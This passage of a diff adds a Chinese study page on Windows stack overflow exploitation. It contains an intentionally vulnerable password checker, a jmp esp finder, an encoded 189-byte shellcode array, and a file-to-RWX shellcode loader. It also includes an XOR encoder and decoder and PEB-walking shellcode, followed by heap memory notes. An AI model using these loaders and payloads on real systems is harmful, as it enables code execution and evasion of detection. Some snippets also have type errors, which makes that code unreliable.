+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span><span style="">#include&lt;stdio.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;stdlib.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;Windows.h&gt;
+</span></span></span><span style="display:flex;"><span><span style=""></span>
+</span></span><span style="display:flex;"><span><span style="">#define PASSWORD &#34;1234567&#34;
+</span></span></span><span style="display:flex;"><span><span style=""></span><span style="">int</span> verify_password(<span style="">char</span>* password)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="">int</span> authenticated;
+</span></span><span style="display:flex;"><span>    <span style="">char</span> buffer[44];
+</span></span><span style="display:flex;"><span>    authenticated = strcmp(password, PASSWORD);
+</span></span><span style="display:flex;"><span>    strcpy(buffer, password);
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">return</span> authenticated;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="">int</span> main()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="">int</span> valid_flag = 0;
+</span></span><span style="display:flex;"><span>    <span style="">char</span> password[1024];
+</span></span><span style="display:flex;"><span>    FILE* fp;
+</span></span><span style="display:flex;"><span>    LoadLibrary(<span style="font-style:italic">&#34;user32.dll&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">if</span> (!(fp = fopen(<span style="font-style:italic">&#34;C:</span><span style="font-weight:bold;font-style:italic">\\</span><span style="font-style:italic">Users</span><span style="font-weight:bold;font-style:italic">\\</span><span style="font-style:italic">VirAy</span><span style="font-weight:bold;font-style:italic">\\</span><span style="font-style:italic">Desktop</span><span style="font-weight:bold;font-style:italic">\\</span><span style="font-style:italic">flag.txt&#34;</span>, <span style="font-style:italic">&#34;rw+&#34;</span>)))
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        exit(0);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    fscanf(fp, <span style="font-style:italic">&#34;%s&#34;</span>, password);
+</span></span><span style="display:flex;"><span>    valid_flag = verify_password(password);
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">if</span> (valid_flag)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="font-style:italic">&#34;Password is correct!</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="font-style:italic">&#34;Password is incorrect!</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    fclose(fp);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>函数代码在栈中保存顺序：
+buffer
+前栈帧EBP
+返回地址
+ESP</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="font-style:italic">//寻找jmp esp
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span><span style="">#include&lt;stdio.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;stdlib.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;Windows.h&gt;
+</span></span></span><span style="display:flex;"><span><span style=""></span>
+</span></span><span style="display:flex;"><span><span style="">#define DLL_NAME &#34;user32.dll&#34;
+</span></span></span><span style="display:flex;"><span><span style=""></span>
+</span></span><span style="display:flex;"><span><span style="">int</span> main(<span style="">int</span> argc, <span style="">char</span>* argv[])
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	HINSTANCE hInstance = LoadLibrary(DLL_NAME);
+</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">if</span> (!hInstance)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		exit(0);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	BYTE* ptr;
+</span></span><span style="display:flex;"><span>	ptr = (BYTE*)hInstance;
+</span></span><span style="display:flex;"><span>	BOOL flag = false;
+</span></span><span style="display:flex;"><span>	<span style="">int</span> count = 0;
+</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">for</span> (<span style="">int</span> i = 0; !flag; i++)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">if</span> (ptr[i] == 0Xff &amp;&amp; ptr[i + 1] == 0Xe4)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="">int</span> address = (<span style="">int</span>)ptr + i;
+</span></span><span style="display:flex;"><span>			printf(<span style="font-style:italic">&#34;opcode address:0x%x</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>,address);
+</span></span><span style="display:flex;"><span>			count++;
+</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">if</span> (count == 50)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				system(<span style="font-style:italic">&#34;pause&#34;</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">return</span> 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><img src="/images/pwn0004.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="">unsigned</span> <span style="">char</span> SHELLCODE[189] = {
+</span></span><span style="display:flex;"><span>	0x83, 0xC0, 0x14, 0x33, 0xC9, 0x8A, 0x1C, 0x08,
+</span></span><span style="display:flex;"><span>	0x80, 0xF3, 0x44, 0x88, 0x1C, 0x08, 0x41, 0x80,
+</span></span><span style="display:flex;"><span>	0xFB, 0x90, 0x75, 0xF1, 0xB8, 0x2C, 0x2E, 0x4E,
+</span></span><span style="display:flex;"><span>	0x7C, 0x5A, 0x2C, 0x27, 0xCD, 0x95, 0x0B, 0x2C,
+</span></span><span style="display:flex;"><span>	0x76, 0x30, 0xD5, 0x48, 0xCF, 0xB0, 0xC9, 0x3A,
+</span></span><span style="display:flex;"><span>	0xB0, 0x77, 0x9F, 0xF3, 0x40, 0x6F, 0xA7, 0x22,
+</span></span><span style="display:flex;"><span>	0xFF, 0x77, 0x76, 0x17, 0x2C, 0x31, 0x37, 0x21,
+</span></span><span style="display:flex;"><span>	0x36, 0x10, 0x77, 0x96, 0x20, 0xCF, 0x1E, 0x74,
+</span></span><span style="display:flex;"><span>	0xCF, 0x0F, 0x48, 0xCF, 0x0D, 0x58, 0xCF, 0x4D,
+</span></span><span style="display:flex;"><span>	0xCF, 0x2D, 0x4C, 0xE9, 0x79, 0x2E, 0x4E, 0x7C,
+</span></span><span style="display:flex;"><span>	0x5A, 0x31, 0x41, 0xD1, 0xBB, 0x13, 0xBC, 0xD1,
+</span></span><span style="display:flex;"><span>	0x24, 0xCF, 0x01, 0x78, 0xCF, 0x08, 0x41, 0x3C,
+</span></span><span style="display:flex;"><span>	0x47, 0x89, 0xCF, 0x1D, 0x64, 0x47, 0x99, 0x77,
+</span></span><span style="display:flex;"><span>	0xBB, 0x03, 0xCF, 0x70, 0xFF, 0x47, 0xB1, 0xDD,
+</span></span><span style="display:flex;"><span>	0x48, 0xFA, 0x42, 0x7E, 0x80, 0x30, 0x4C, 0x85,
+</span></span><span style="display:flex;"><span>	0x8E, 0x43, 0x47, 0x94, 0x02, 0xAF, 0xB5, 0x7F,
+</span></span><span style="display:flex;"><span>	0x10, 0x60, 0x58, 0x31, 0xA0, 0xCF, 0x1D, 0x60,
+</span></span><span style="display:flex;"><span>	0x47, 0x99, 0x32, 0xCF, 0x78, 0x3F, 0xCF, 0x1D,
+</span></span><span style="display:flex;"><span>	0x58, 0x47, 0x99, 0x47, 0x68, 0xFF, 0xD1, 0x1B,
+</span></span><span style="display:flex;"><span>	0xEF, 0x13, 0x25, 0x79, 0x2E, 0x4E, 0x7F, 0x5A,
+</span></span><span style="display:flex;"><span>	0x31, 0xED, 0x77, 0x9F, 0x17, 0x2C, 0x33, 0x21,
+</span></span><span style="display:flex;"><span>	0x37, 0x30, 0x2C, 0x22, 0x25, 0x2D, 0x28, 0xCF,
+</span></span><span style="display:flex;"><span>	0x80, 0x17, 0x14, 0x14, 0x17, 0xBB, 0x13, 0xB8,
+</span></span><span style="display:flex;"><span>	0x17, 0xBB, 0x13, 0xBC, 0xD4
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="">int</span> main(<span style="">int</span> argc,<span style="">char</span>** argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">__asm</span>
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		LEA EAX,SHELLCODE
+</span></span><span style="display:flex;"><span>		PUSH EAX
+</span></span><span style="display:flex;"><span>		RET
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="font-style:italic">//计算函数哈希
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span><span style="">#include&lt;stdio.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;stdlib.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;time.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;Windows.h&gt;
+</span></span></span><span style="display:flex;"><span><span style=""></span>
+</span></span><span style="display:flex;"><span>DWORD GetHash(<span style="">char</span> *fun_name)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	DWORD d = 0;
+</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">while</span> (*fun_name)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		d = ((d &lt;&lt; 25) | (d &gt;&gt; 7));
+</span></span><span style="display:flex;"><span>		d += *fun_name;
+</span></span><span style="display:flex;"><span>		fun_name++;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">return</span> d;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="">int</span> main(<span style="">int</span> argc,<span style="">char</span>** argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	DWORD hash;
+</span></span><span style="display:flex;"><span>	hash = GetHash((<span style="">char</span>*)<span style="font-style:italic">&#34;MessageBoxA&#34;</span>);
+</span></span><span style="display:flex;"><span>	printf(<span style="font-style:italic">&#34;%.8x\h&#34;</span>,hash);
+</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">return</span> 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="font-style:italic">//加载shellcode
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span><span style="">#include&lt;stdio.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;Windows.h&gt;
+</span></span></span><span style="display:flex;"><span><span style=""></span>
+</span></span><span style="display:flex;"><span><span style="">int</span> main()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	FILE* fp = fopen(<span style="font-style:italic">&#34;file.bin&#34;</span>, <span style="font-style:italic">&#34;rb&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">if</span> (fp)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		fseek(fp, 0, SEEK_END);
+</span></span><span style="display:flex;"><span>		DWORD dwSize = ftell(fp);
+</span></span><span style="display:flex;"><span>		fseek(fp, 0, SEEK_SET);
+</span></span><span style="display:flex;"><span>		LPVOID pAddr = VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>		fread(pAddr, dwSize, 1, fp);
+</span></span><span style="display:flex;"><span>		fclose(fp);
+</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">__asm</span> {
+</span></span><span style="display:flex;"><span>			mov eax, pAddr;
+</span></span><span style="display:flex;"><span>			call eax;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="font-style:italic">//异或加密shellcode
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span><span style="">#include&lt;stdio.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;stdlib.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;Windows.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;string.h&gt;
+</span></span></span><span style="display:flex;"><span><span style=""></span>
+</span></span><span style="display:flex;"><span><span style="">char</span> SHELLCODE[189] = {
+</span></span><span style="display:flex;"><span>    0x83, 0xC0, 0x14, 0x33, 0xC9, 0x8A, 0x1C, 0x08,
+</span></span><span style="display:flex;"><span>    0x80, 0xF3, 0x44, 0x88, 0x1C, 0x08, 0x41, 0x80,
+</span></span><span style="display:flex;"><span>    0xFB, 0x90, 0x75, 0xF1, 0xB8, 0x2C, 0x2E, 0x4E,
+</span></span><span style="display:flex;"><span>    0x7C, 0x5A, 0x2C, 0x27, 0xCD, 0x95, 0x0B, 0x2C,
+</span></span><span style="display:flex;"><span>    0x76, 0x30, 0xD5, 0x48, 0xCF, 0xB0, 0xC9, 0x3A,
+</span></span><span style="display:flex;"><span>    0xB0, 0x77, 0x9F, 0xF3, 0x40, 0x6F, 0xA7, 0x22,
+</span></span><span style="display:flex;"><span>    0xFF, 0x77, 0x76, 0x17, 0x2C, 0x31, 0x37, 0x21,
+</span></span><span style="display:flex;"><span>    0x36, 0x10, 0x77, 0x96, 0x20, 0xCF, 0x1E, 0x74,
+</span></span><span style="display:flex;"><span>    0xCF, 0x0F, 0x48, 0xCF, 0x0D, 0x58, 0xCF, 0x4D,
+</span></span><span style="display:flex;"><span>    0xCF, 0x2D, 0x4C, 0xE9, 0x79, 0x2E, 0x4E, 0x7C,
+</span></span><span style="display:flex;"><span>    0x5A, 0x31, 0x41, 0xD1, 0xBB, 0x13, 0xBC, 0xD1,
+</span></span><span style="display:flex;"><span>    0x24, 0xCF, 0x01, 0x78, 0xCF, 0x08, 0x41, 0x3C,
+</span></span><span style="display:flex;"><span>    0x47, 0x89, 0xCF, 0x1D, 0x64, 0x47, 0x99, 0x77,
+</span></span><span style="display:flex;"><span>    0xBB, 0x03, 0xCF, 0x70, 0xFF, 0x47, 0xB1, 0xDD,
+</span></span><span style="display:flex;"><span>    0x48, 0xFA, 0x42, 0x7E, 0x80, 0x30, 0x4C, 0x85,
+</span></span><span style="display:flex;"><span>    0x8E, 0x43, 0x47, 0x94, 0x02, 0xAF, 0xB5, 0x7F,
+</span></span><span style="display:flex;"><span>    0x10, 0x60, 0x58, 0x31, 0xA0, 0xCF, 0x1D, 0x60,
+</span></span><span style="display:flex;"><span>    0x47, 0x99, 0x32, 0xCF, 0x78, 0x3F, 0xCF, 0x1D,
+</span></span><span style="display:flex;"><span>    0x58, 0x47, 0x99, 0x47, 0x68, 0xFF, 0xD1, 0x1B,
+</span></span><span style="display:flex;"><span>    0xEF, 0x13, 0x25, 0x79, 0x2E, 0x4E, 0x7F, 0x5A,
+</span></span><span style="display:flex;"><span>    0x31, 0xED, 0x77, 0x9F, 0x17, 0x2C, 0x33, 0x21,
+</span></span><span style="display:flex;"><span>    0x37, 0x30, 0x2C, 0x22, 0x25, 0x2D, 0x28, 0xCF,
+</span></span><span style="display:flex;"><span>    0x80, 0x17, 0x14, 0x14, 0x17, 0xBB, 0x13, 0xB8,
+</span></span><span style="display:flex;"><span>    0x17, 0xBB, 0x13, 0xBC, 0xD4
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="font-style:italic">// 加密函数，将输入数据进行异或加密后保存到文件
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span><span style="">void</span> encoder(<span style="">char</span> *input, <span style="">unsigned</span> <span style="">char</span> key)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="">int</span> i = 0, len = 0;
+</span></span><span style="display:flex;"><span>    FILE *fp;
+</span></span><span style="display:flex;"><span>    <span style="">unsigned</span> <span style="">char</span> *output;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    len = strlen(input);
+</span></span><span style="display:flex;"><span>    output = (<span style="">unsigned</span> <span style="">char</span> *)malloc(len + 1);
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">if</span> (!output)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="font-style:italic">&#34;Error:Memory Allocation Failed</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>);
+</span></span><span style="display:flex;"><span>        exit(1);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="font-style:italic">// 进行异或加密操作
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>    <span style="font-weight:bold">for</span> (i = 0; i &lt; len; i++)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        output[i] = input[i] ^ key;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">if</span> (!(fp = fopen(<span style="font-style:italic">&#34;encode.txt&#34;</span>, <span style="font-style:italic">&#34;wb&#34;</span>)))  <span style="font-style:italic">// 以二进制写模式打开文件更合适，避免文本模式的一些潜在转换问题
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="font-style:italic">&#34;Error:File Not Found</span><span style="font-weight:bold;font-style:italic">\n</span><span style="font-style:italic">&#34;</span>);
+</span></span><span style="display:flex;"><span>        free(output);  <span style="font-style:italic">// 如果文件打开失败，释放已分配的内存
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>        exit(1);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="font-style:italic">// 将加密后的数据写入文件
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>    fwrite(output, <span style="font-weight:bold">sizeof</span>(<span style="">unsigned</span> <span style="">char</span>), len, fp);
+</span></span><span style="display:flex;"><span>    fclose(fp);
+</span></span><span style="display:flex;"><span>    free(output);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="">int</span> main()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    encoder(SHELLCODE, 0xFF);
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">return</span> 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="font-style:italic">//shellcode解码
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span><span style="font-weight:bold">__asm</span> <span style="">int</span> 3
+</span></span><span style="display:flex;"><span><span style="font-weight:bold">__asm</span>{
+</span></span><span style="display:flex;"><span>    nop
+</span></span><span style="display:flex;"><span>    nop
+</span></span><span style="display:flex;"><span>    nop
+</span></span><span style="display:flex;"><span>    xor ecx,ecx
+</span></span><span style="display:flex;"><span>decode_loop:
+</span></span><span style="display:flex;"><span>    mov bl,[eax+ecx]
+</span></span><span style="display:flex;"><span>    xor bl,key
+</span></span><span style="display:flex;"><span>    mov[eax+ecx],bl
+</span></span><span style="display:flex;"><span>    inc ecx
+</span></span><span style="display:flex;"><span>    cmp bl,0x90
+</span></span><span style="display:flex;"><span>    jne decode_loop
+</span></span><span style="display:flex;"><span>    nop
+</span></span><span style="display:flex;"><span>    nop
+</span></span><span style="display:flex;"><span>    nop
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="font-style:italic">//通用shellcode
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span><span style="">#include&lt;stdio.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;stdlib.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;Windows.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#include&lt;string.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="">#pragma code_seg(&#34;shell&#34;)
+</span></span></span><span style="display:flex;"><span><span style="">#pragma comment(link,&#34;/entry:myshellcode&#34;)
+</span></span></span><span style="display:flex;"><span><span style=""></span><span style="">void</span> myshellcode()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">typedef</span> FARPROC (WINAPI *fnGetProcAddress)(HMODULE hModule,LPCSTR lpProcName);
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">typedef</span> HMODULE (WINAPI *fnLoadLibraryExA)(LPCSTR lpLibFileName,HANDLE hFile,DWORD dwFlags); 
+</span></span><span style="display:flex;"><span>    DWORD dwKernel32Addr=0;
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">__asm</span>{
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">//*****获取kernel32.dll模块基址开始*****
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>        push eax
+</span></span><span style="display:flex;"><span>        mov eax,dword ptr fs:[30]
+</span></span><span style="display:flex;"><span>        mov eax,[eax+0x0C]
+</span></span><span style="display:flex;"><span>        mov eax,[eax+0x1C]
+</span></span><span style="display:flex;"><span>        mov eax,[eax]
+</span></span><span style="display:flex;"><span>        mov eax,[eax+0x08]
+</span></span><span style="display:flex;"><span>        mov dwKernel32Addr,eax
+</span></span><span style="display:flex;"><span>        pop eax
+</span></span><span style="display:flex;"><span>         <span style="font-style:italic">//*****获取kernel32.dll模块基址结束*****
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>    }
+</span></span><span style="display:flex;"><span>    <span style="font-style:italic">//*****获取GetProcAddress函数地址开始*****
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>    DWORD dwAddrBase=dwKernel32Addr;
+</span></span><span style="display:flex;"><span>    PIMAGE_DOS_HEADER pDosHeader;
+</span></span><span style="display:flex;"><span>    PIMAGE_NT_HEADERS pNtHeader;
+</span></span><span style="display:flex;"><span>    pDosHeader=(PIMAGE_DOS_HEADER)dwAddrBase;
+</span></span><span style="display:flex;"><span>    pNtHeader=(PIMAGE_NT_HEADERS)(dwAddrBase+pDosHeader-&gt;e_lfanew);
+</span></span><span style="display:flex;"><span>    PIMAGE_DATA_DIRECTORY pDataDir;
+</span></span><span style="display:flex;"><span>    PIMAGE_EXPORT_DIRECTORY pExportDir;
+</span></span><span style="display:flex;"><span>    pDataDir=pNtHeader-&gt;OptionalHeader.DataDirectory+IMAGE_DIRECTORY_ENTRY_EXPORT;
+</span></span><span style="display:flex;"><span>    pExportDir=(PIMAGE_EXPORT_DIRECTORY)(dwAddrBase+pDataDir-&gt;VirtualAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    PDWORD pAddrOfFun=(PWORD)(pExportDir-&gt;AddressOfFunctions+dwAddrBase);
+</span></span><span style="display:flex;"><span>    PDWORD pAddrOfName=(PDWORD)(pExportDir-&gt;AddressOfNames+dwAddrBase);
+</span></span><span style="display:flex;"><span>    PWORD pAddrOfOrd=(PWORD)(pExportDir-&gt;AddressOfNameOrdinals+dwAddrBase);
+</span></span><span style="display:flex;"><span>    DWORD dwFunAddr;
+</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">for</span>(DWORD i=0;i&lt;pExportDir-&gt;NumberOfNames;i++)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="">char</span> *pName=(<span style="">char</span>*)(pAddrOfName[i]+dwAddrBase);
+</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">if</span>(strcmp(pName,<span style="font-style:italic">&#34;GetProcAddress&#34;</span>)==0)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            dwFunAddr=pAddrOfFun[pAddrOfOrd[i]]+dwAddrBase;
+</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="font-style:italic">//*****获取GetProcAddress函数地址结束*****
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>    <span style="">char</span> szLoadLibraryExA[]={<span style="font-style:italic">&#39;L&#39;</span>,<span style="font-style:italic">&#39;o&#39;</span>,<span style="font-style:italic">&#39;a&#39;</span>,<span style="font-style:italic">&#39;d&#39;</span>,<span style="font-style:italic">&#39;L&#39;</span>,<span style="font-style:italic">&#39;i&#39;</span>,<span style="font-style:italic">&#39;b&#39;</span>,<span style="font-style:italic">&#39;r&#39;</span>,<span style="font-style:italic">&#39;a&#39;</span>,<span style="font-style:italic">&#39;r&#39;</span>,<span style="font-style:italic">&#39;y&#39;</span>,<span style="font-style:italic">&#39;E&#39;</span>,<span style="font-style:italic">&#39;x&#39;</span>,<span style="font-style:italic">&#39;A&#39;</span>,<span style="font-style:italic">&#39;\0&#39;</span>};
+</span></span><span style="display:flex;"><span>    <span style="font-style:italic">//char szUser32[]={&#39;u&#39;,&#39;s&#39;,&#39;e&#39;,&#39;r&#39;,&#39;3&#39;,&#39;2&#39;,&#39;\0&#39;};
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>    <span style="font-style:italic">//char szMessageBoxA[]={&#39;M&#39;,&#39;e&#39;,&#39;s&#39;,&#39;s&#39;,&#39;a&#39;,&#39;g&#39;,&#39;e&#39;,&#39;B&#39;,&#39;o&#39;,&#39;x&#39;,&#39;A&#39;,&#39;\0&#39;};
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>    <span style="font-style:italic">//char szExitProcess[]={&#39;E&#39;,&#39;x&#39;,&#39;i&#39;,&#39;t&#39;,&#39;P&#39;,&#39;r&#39;,&#39;o&#39;,&#39;c&#39;,&#39;e&#39;,&#39;s&#39;,&#39;s&#39;,&#39;\0&#39;};
+</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>    fnGetProcAddress pfnGetProcAddress=(fnGetProcAddress)dwFunAddr;
+</span></span><span style="display:flex;"><span>    LoadLibraryExA pfnLoadLibraryExA=(fnLoadLibraryExA)pfnGetProcAddress((HMODULE)dwKernel32Addr,szLoadLibraryExA);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><table>
+  <thead>
+      <tr>
+          <th></th>
+          <th>堆内存</th>
+          <th>栈内存</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>典型用例</td>
+          <td>动态增长的链表等数据结构</td>
+          <td>函数局部数组</td>
+      </tr>
+      <tr>
+          <td>申请方式</td>
+          <td>使用函数申请，通过指针使用</td>
+          <td>直接声明</td>
+      </tr>
+      <tr>
+          <td>释放方式</td>
+          <td>使用函数释放</td>
+          <td>系统回收</td>
+      </tr>
+      <tr>
+          <td>管理方式</td>
+          <td>使用者申请与释放</td>
+          <td>系统完成申请与释放</td>
+      </tr>
+      <tr>
+          <td>所处位置</td>
+          <td>变化范围很大</td>
+          <td>0X0012XXXX</td>
+      </tr>
+      <tr>
+          <td>增长方向</td>
+          <td>由低到高</td>
+          <td>由高到低</td>
+      </tr>
+  </tbody>
+</table>
+<p>windows堆分配
+通过堆，内存管理器将一块较大的内存空间委托给堆管理器来管理；</p>
+<ul>
+<li>用户态
+小内存：堆管理器分配堆，调用堆分配API从堆管理器分配堆，堆分配API包括LocalAlloc、GlobalAlloc、HeapAlloc、malloc等；</li>
+</ul>
+<p>大内存：内存管理器分配堆，调用虚拟内存分配API来从内存管理器分配内存，虚拟内存API包括VirtualAlloc、VirtualAllocEx、VirtualFree、VirtualFreeEx、VirtualLock、VirtualUnload、VirtualPotect、VirtualQuery等；</p>
+<ul>
+<li>内核态
+小内存：池管理器（Pool Manager）。池管理器公开了一组驱动程序接口以向外提供服务，包括ExAllocatePool、ExAllocatePoolwithTag、ExAllocatePoolWithTagPriority、ExAllocatePoolwithQuota、ExFessPool、ExFreePoolwithTag等；
